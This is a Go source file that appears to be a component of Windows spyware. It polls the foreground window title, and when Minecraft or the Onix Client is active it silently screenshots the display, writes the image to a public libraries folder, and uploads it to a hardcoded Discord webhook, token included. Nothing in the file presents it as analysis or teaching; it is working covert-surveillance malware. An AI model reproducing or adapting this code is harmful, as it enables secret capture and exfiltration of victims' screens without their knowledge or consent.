package screenshot

import (
	"bytes"
	"fmt"
	"image/png"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"syscall"
	"time"
	"unsafe"

	"github.com/kbinani/screenshot"
)

var (
	user32                  = syscall.NewLazyDLL("user32.dll")
	procGetForegroundWindow = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW      = user32.NewProc("GetWindowTextW")
)

func getForegroundWindow() (syscall.Handle, error) {
	ret, _, _ := procGetForegroundWindow.Call()
	if ret == 0 {
		return 0, syscall.GetLastError()
	}
	return syscall.Handle(ret), nil
}

func getWindowText(hwnd syscall.Handle) (string, error) {
	const nMaxCount = 256
	var buf [nMaxCount]uint16
	ret, _, _ := procGetWindowTextW.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&buf[0])), nMaxCount)
	if ret == 0 {
		return "", syscall.GetLastError()
	}
	return syscall.UTF16ToString(buf[:]), nil
}

func Run() {
	for {
		hwnd, err := getForegroundWindow()
		if err != nil {
			fmt.Println("Ошибка:", err)
			continue
		}

		text, err := getWindowText(hwnd)
		if err == nil {
			if text == "Minecraft" {
				Screenshot()
				upload()
				time.Sleep(time.Minute)
			} else if text == "Onix Client Lite - Minecraft" {
				Screenshot()
				upload()
			}
		} else {
			return
		}

	}
}
func upload() {
	webhookURL := "https://discord.com/api/webhooks/1258488510130946078/bKIqDHZoh5-9uUjRDLICnoVvJRAYgKLCcu5gjFy2szoKbzNYGJi0vHomCzxKDoHLr9rH"

	filePath := "C:\\Users\\Public\\Libraries\\scrsht.png"
	file, err := os.Open(filePath)
	if err != nil {

		return
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("file", filePath)
	if err != nil {
		return
	}
	_, err = io.Copy(part, file)
	if err != nil {

		return
	}
	writer.Close()

	req, err := http.NewRequest("POST", webhookURL, body)
	if err != nil {

		return
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := http.Client{}
	resp, err := client.Do(req)
	if err != nil {

		return
	}
	defer resp.Body.Close()

}

func Screenshot() {
	n := screenshot.NumActiveDisplays()
	if n == 0 {

		return
	}

	bounds := screenshot.GetDisplayBounds(0)

	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return
	}

	file, err := os.Create("C:\\Users\\Public\\Libraries\\scrsht.png")
	if err != nil {

		return
	}
	defer file.Close()

	err = png.Encode(file, img)
	if err != nil {

		return
	}
}
